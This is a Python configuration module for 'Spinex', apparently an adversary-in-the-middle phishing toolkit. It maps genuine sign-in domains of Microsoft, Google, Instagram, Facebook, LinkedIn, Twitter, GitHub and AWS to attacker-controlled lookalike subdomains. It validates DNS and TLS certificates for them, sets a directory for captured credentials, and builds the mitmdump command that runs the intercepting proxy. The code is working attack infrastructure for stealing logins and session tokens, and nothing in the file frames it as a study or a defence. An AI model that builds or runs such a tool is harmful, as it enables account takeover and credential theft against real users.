"""
config_manager.py — Spinex configuration manager

Handles loading, saving, validating, and deriving runtime config
(DOMAIN_MAP, cert paths, proxy flags) from spinex_config.json.

All other Spinex modules import from here rather than touching the JSON directly.
"""

import json
import os
import socket
import datetime
from copy import deepcopy

import sys as _sys
_AITM_DIR = os.path.dirname(os.path.abspath(__file__))
BASE_DIR  = os.path.dirname(_AITM_DIR)   # Spinex root
if _AITM_DIR not in _sys.path:
    _sys.path.insert(0, _AITM_DIR)

CONFIG_PATH = os.path.join(BASE_DIR, "spinex_config.json")

DEFAULT_CONFIG: dict = {
    "domain": {
        "base":       "",      # e.g. "evil-portal.com"
        "server_ip":  "",      # e.g. "1.2.3.4"
        "acme_email": "",      # e.g. "you@proton.me"  (for Let's Encrypt)
    },
    "platforms": {
        "microsoft": False,
        "google":    False,
        "instagram": False,
        "facebook":  False,
        "linkedin":  False,
        "twitter":   False,
        "github":    False,
        "aws":       False,
    },
    "proxy": {
        "port":        443,
        "listen_host": "0.0.0.0",
        "cert_path":   "",     # filled automatically after cert fetch
        "key_path":    "",
    },
    "output": {
        "creds_dir": "creds",
    },
    "meta": {
        "created":       "",
        "last_modified": "",
    },
}

# ---------------------------------------------------------------------------
# Platform → real upstream domains + subdomain prefix for proxy domain
#
# Structure:
#   platform_key: {
#       "subdomain_prefix": prefix used for proxy subdomains,
#       "real_domains":     list of real upstream domains to rewrite,
#   }
# ---------------------------------------------------------------------------
PLATFORM_DEFINITIONS: dict[str, dict] = {
    "microsoft": {
        "subdomain_prefix": "login",
        "real_domains": [
            "login.microsoftonline.com",
            "login.live.com",
            "aadcdn.msauth.net",
            "account.microsoft.com",
        ],
    },
    "google": {
        "subdomain_prefix": "accounts",
        "real_domains": [
            "accounts.google.com",
            "oauth2.googleapis.com",
            "www.googleapis.com",
        ],
    },
    "instagram": {
        "subdomain_prefix": "instagram",
        "real_domains": [
            "www.instagram.com",
            "i.instagram.com",
            "graph.instagram.com",
            "graphql.instagram.com",
        ],
    },
    "facebook": {
        "subdomain_prefix": "facebook",
        "real_domains": [
            "www.facebook.com",
            "m.facebook.com",
        ],
    },
    "linkedin": {
        "subdomain_prefix": "linkedin",
        "real_domains": [
            "www.linkedin.com",
            "api.linkedin.com",
        ],
    },
    "twitter": {
        "subdomain_prefix": "twitter",
        "real_domains": [
            "twitter.com",
            "api.twitter.com",
            "x.com",
        ],
    },
    "github": {
        "subdomain_prefix": "github",
        "real_domains": [
            "github.com",
            "api.github.com",
        ],
    },
    "aws": {
        "subdomain_prefix": "aws",
        "real_domains": [
            "signin.aws.amazon.com",
            "console.aws.amazon.com",
            "sts.amazonaws.com",
        ],
    },
}


def load() -> dict:
    """
    Load spinex_config.json.  If the file doesn't exist, return a deep copy
    of DEFAULT_CONFIG (does not write to disk — that happens on first save).
    Missing keys are back-filled from defaults so old config files stay valid
    after upgrades that add new fields.
    """
    if not os.path.exists(CONFIG_PATH):
        return deepcopy(DEFAULT_CONFIG)

    with open(CONFIG_PATH, "r") as f:
        stored = json.load(f)

    # Back-fill any missing keys from defaults (recursive)
    return _merge_defaults(stored, DEFAULT_CONFIG)


def save(config: dict) -> None:
    """
    Write config to spinex_config.json, updating last_modified timestamp.
    Creates the file if it doesn't exist.
    """
    config = deepcopy(config)
    now    = str(datetime.datetime.now())

    if not config["meta"]["created"]:
        config["meta"]["created"] = now
    config["meta"]["last_modified"] = now

    with open(CONFIG_PATH, "w") as f:
        json.dump(config, f, indent=2)


def _merge_defaults(stored: dict, defaults: dict) -> dict:
    """Recursively fill missing keys in stored with values from defaults."""
    result = deepcopy(defaults)
    for key, value in stored.items():
        if key in result and isinstance(result[key], dict) and isinstance(value, dict):
            result[key] = _merge_defaults(value, result[key])
        else:
            result[key] = value
    return result

class ConfigError(Exception):
    pass


def validate(config: dict) -> list[str]:
    """
    Return a list of human-readable error strings.
    Empty list means the config is valid and ready to use.
    """
    errors = []

    base = config.get("domain", {}).get("base", "").strip()
    ip   = config.get("domain", {}).get("server_ip", "").strip()
    email = config.get("domain", {}).get("acme_email", "").strip()

    if not base:
        errors.append("Base domain is required (e.g. evil-portal.com)")
    elif base.startswith("http"):
        errors.append("Base domain should not include http:// or https://")
    elif "." not in base:
        errors.append(f"'{base}' doesn't look like a valid domain")

    if not ip:
        errors.append("Server IP is required")
    else:
        try:
            socket.inet_aton(ip)
        except socket.error:
            errors.append(f"'{ip}' is not a valid IPv4 address")

    if not email:
        errors.append("ACME email is required for Let's Encrypt cert generation")
    elif "@" not in email:
        errors.append(f"'{email}' doesn't look like a valid email address")

    active = [p for p, v in config.get("platforms", {}).items() if v]
    if not active:
        errors.append("At least one platform must be enabled")

    return errors


def generate_domain_map(config: dict) -> dict[str, str]:
    """
    Build the DOMAIN_MAP dict used by aitm_addon.py.

    Returns:
        { "real.domain.com": "proxy.subdomain.base.com", ... }

    Only includes platforms that are enabled in config["platforms"].
    Returns {} if base domain is not set.
    """
    base = config.get("domain", {}).get("base", "").strip()
    if not base:
        return {}

    domain_map = {}
    for platform, enabled in config.get("platforms", {}).items():
        if not enabled:
            continue
        definition = PLATFORM_DEFINITIONS.get(platform)
        if not definition:
            continue
        prefix = definition["subdomain_prefix"]
        for i, real_domain in enumerate(definition["real_domains"]):
            # First domain gets the main subdomain prefix
            # Additional domains (CDN, API, etc.) get prefix-2, prefix-3, etc.
            if i == 0:
                proxy_domain = f"{prefix}.{base}"
            else:
                proxy_domain = f"{prefix}-{i + 1}.{base}"
            domain_map[real_domain] = proxy_domain

    return domain_map


def get_active_platforms(config: dict) -> list[str]:
    """Return list of enabled platform names."""
    return [p for p, v in config.get("platforms", {}).items() if v]


def get_proxy_subdomains(config: dict) -> list[str]:
    """
    Return all proxy subdomains that need DNS records and TLS coverage.
    These are the values of generate_domain_map() — the attacker's domains.
    """
    return list(set(generate_domain_map(config).values()))


def check_dns(config: dict) -> dict[str, dict]:
    """
    For each proxy subdomain, attempt to resolve it and check whether it
    points at the configured server IP.

    Returns:
        {
            "login.evil-portal.com": {
                "resolved": "1.2.3.4",
                "expected": "1.2.3.4",
                "ok": True,
                "error": None,
            },
            ...
        }
    """
    server_ip  = config.get("domain", {}).get("server_ip", "").strip()
    subdomains = get_proxy_subdomains(config)
    results    = {}

    for subdomain in subdomains:
        entry: dict = {"resolved": None, "expected": server_ip, "ok": False, "error": None}
        try:
            resolved = socket.gethostbyname(subdomain)
            entry["resolved"] = resolved
            entry["ok"]       = (resolved == server_ip)
        except socket.gaierror as e:
            entry["error"] = str(e)
        results[subdomain] = entry

    return results

def get_cert_paths(config: dict) -> tuple[str, str]:
    """
    Return (cert_path, key_path) from config.
    If explicitly set, uses those.  Otherwise derives the default
    Let's Encrypt path for the base domain.
    """
    cert = config.get("proxy", {}).get("cert_path", "").strip()
    key  = config.get("proxy", {}).get("key_path", "").strip()
    base = config.get("domain", {}).get("base", "").strip()

    if not cert and base:
        cert = f"/etc/letsencrypt/live/{base}/fullchain.pem"
    if not key and base:
        key = f"/etc/letsencrypt/live/{base}/privkey.pem"

    return cert, key


def cert_exists(config: dict) -> bool:
    """Return True if the cert and key files both exist on disk."""
    cert, key = get_cert_paths(config)
    return bool(cert and key and os.path.exists(cert) and os.path.exists(key))


def build_mitmproxy_cmd(config: dict) -> list[str]:
    """
    Build the mitmdump command list ready for subprocess.Popen().

    Example output:
        ["mitmdump", "-s", "aitm_addon.py",
         "--mode", "regular",
         "--listen-host", "0.0.0.0",
         "--listen-port", "443",
         "--certs", "*=/path/to/combined.pem"]
    """
    cert, key = get_cert_paths(config)
    port      = config.get("proxy", {}).get("port", 443)
    host      = config.get("proxy", {}).get("listen_host", "0.0.0.0")
    addon     = os.path.join(BASE_DIR, "aitm", "aitm_addon.py")

    # mitmproxy expects cert + key combined in one PEM file
    combined_cert = os.path.join(BASE_DIR, "creds", "combined-cert.pem")

    cmd = [
        "mitmdump",
        "-s",       addon,
        "--mode",   "regular",
        "--listen-host", host,
        "--listen-port", str(port),
        "--certs",  f"*={combined_cert}",
        "--set",    "ssl_insecure=true",   # allow upstream cert errors during testing
    ]
    return cmd
